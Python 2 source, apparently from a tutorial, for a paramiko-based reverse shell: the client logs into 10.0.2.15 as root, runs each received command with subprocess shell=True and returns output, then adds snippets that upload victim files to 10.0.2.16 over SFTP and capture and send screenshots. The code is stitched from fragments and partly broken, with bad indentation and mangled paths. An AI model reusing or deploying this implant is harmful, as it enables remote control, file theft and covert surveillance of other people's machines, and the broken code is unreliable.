# Client

import paramiko
import threading
import subprocess
 
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('10.0.2.15', username='root', password='toor')
chan = client.get_transport().open_session()
chan.send('Hey i am connected :) ')
print chan.recv(1024)
client.close

# ‘subprocess.check_output’ execute the received command
# and return its output as a byte string to ‘CMD‘ variable,
# which gets transferred back to server.
# Note that we use exception handling with ‘subprocess.check_output’
# because if the attacker mistyped a command,
# this will raise an exception and we will lose our shell.
# We definitely don’t want this. 
while True:
    command = chan.recv(1024)
    try:
        CMD = subprocess.check_output(command, shell=True)
        chan.send(CMD)
    except Exception,e:
        chan.send(str(e))


# SFTP Client
def sftp(local_path,name):
    try:
        transport = paramiko.Transport(('10.0.2.16', 22))
        transport.connect(username = 'root', password = 'toor')
    sftp = paramiko.SFTPClient.from_transport(transport)
    sftp.put(local_path, '/root/Desktop/SFTP-Upload/'+name)
    sftp.close()
    transport.close()
    return '[+] Done'
  except Exception,e:
    return str(e)
 
while True:
    command = chan.recv(1024)
    if 'grab' in command:
        grab,name,path = command.split('*')
        chan.send( sftp(path,name) )


# Grab screenshot!!
from PIL import ImageGrab
 
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save('C:UsersHussamDesktopscreenshot.png')
    except Exception,e:
        return str(e)
    return sftp('C:UsersHussamDesktopscreenshot.png','screenshot')
 
while True:
 
    command = chan.recv(1024)
    if 'grab' in command:
        grab,name,path = command.split('*')
        chan.send( sftp(path,name) )
 
    elif 'getscreen' in command:
    chan.send(screenshot())

